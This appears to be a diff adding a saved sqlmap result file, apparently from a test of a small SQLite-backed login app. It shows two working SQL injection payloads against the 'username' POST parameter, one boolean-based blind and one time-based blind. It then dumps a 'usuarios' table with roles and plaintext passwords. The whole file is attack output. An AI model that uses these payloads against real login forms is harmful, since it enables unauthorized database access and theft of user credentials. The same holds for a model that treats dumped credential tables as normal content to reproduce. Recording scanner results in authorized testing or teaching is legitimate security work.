@@ -1,0 +1,22 @@
+sqlmap identified the following injection point(s) with a total of 61 HTTP(s) requests:
+---
+Parameter: username (POST)
+    Type: boolean-based blind
+    Title: SQLite AND boolean-based blind - WHERE or HAVING clause (JSON)
+    Payload: username=admin' AND CASE WHEN 2967=2967 THEN 2967 ELSE JSON(CHAR(90,70,111,111)) END AND 'HUWI'='HUWI&password=x
+
+    Type: time-based blind
+    Title: SQLite > 2.0 AND time-based blind (heavy query)
+    Payload: username=admin' AND 9560=LIKE(CHAR(65,66,67,68,69,70,71),UPPER(HEX(RANDOMBLOB(500000000/2)))) AND 'sDzB'='sDzB&password=x
+---
+back-end DBMS: SQLite
+Database: <current>
+Table: usuarios
+[2 entries]
++----+---------+----------+----------+
+| id | rol     | password | username |
++----+---------+----------+----------+
+| 1  | admin   | admin123 | admin    |
+| 2  | docente | profesor | profesor |
++----+---------+----------+----------+
+
